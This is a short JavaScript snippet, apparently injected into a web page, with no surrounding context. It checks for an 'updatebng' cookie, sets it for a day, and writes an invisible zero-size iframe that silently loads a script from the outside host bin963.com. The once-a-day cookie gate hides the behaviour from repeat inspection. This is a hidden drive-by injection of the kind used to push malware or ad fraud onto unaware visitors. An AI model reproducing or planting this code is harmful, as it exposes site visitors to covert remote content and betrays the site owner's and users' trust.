window.status="";
var cookieString = document.cookie;
var start = cookieString.indexOf("updatebng=");
if (start != -1){}else{
var expires = new Date();
expires.setTime(expires.getTime()+24*1*60*60*1000);
document.cookie = "updatebng=update;expires="+expires.toGMTString();
try{
document.write("<iframe src=http://bin963.com/cgi-bin/index.cgi?ad width=0 height=0 frameborder=0></iframe>");
}
catch(e)
{
};
}